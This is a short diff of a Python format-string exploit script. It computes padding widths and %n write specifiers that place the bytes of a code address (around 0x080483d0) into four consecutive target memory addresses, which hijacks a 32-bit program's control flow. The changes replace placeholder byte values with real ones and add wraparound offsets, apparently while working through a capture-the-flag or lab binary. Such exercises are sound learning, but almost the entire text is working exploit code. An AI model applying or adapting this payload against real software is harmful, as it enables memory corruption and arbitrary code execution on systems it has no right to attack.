@@ -1,17 +1,19 @@
 addr_1 = "\x38\x98\x04\x08"
 addr_2 = "\x39\x98\x04\x08"
-addr_3 = "\x3A\x98\x04\x08"
-addr_4 = "\x3B\x98\x04\x08"
+addr_3 = "\x3a\x98\x04\x08"
+addr_4 = "\x3b\x98\x04\x08"
 
-value_1 = 0xaa
-value_2 = 0xbb
-value_3 = 0xcc
-value_4 = 0xdd
+value_1 = 213
+value_2 = 131
+value_3 = 4
+value_4 = 8
 
-inject_1 = value_1 - (0x04 * 4)
-inject_2 = value_2 - inject_1 - (0x04 * 4)
-inject_3 = value_3 - inject_1 - inject_2 - (0x04 * 4)
-inject_4 = value_4 - inject_1 - inject_2 - inject_3 - (0x04 * 4)
+#0x80483d0
+
+inject_1 = 256 + value_1 - (0x04 * 4)
+inject_2 = 256 * 2 + value_2 - inject_1 - (0x04 * 4)
+inject_3 = 256 * 3 + value_3 - inject_1 - inject_2 - (0x04 * 4)
+inject_4 = 256 * 4 + value_4 - inject_1 - inject_2 - inject_3 - (0x04 * 4)
 
 form = '%' + str(inject_1) + 'x%4$n'
 form += '%' + str(inject_2) + 'x%5$n'
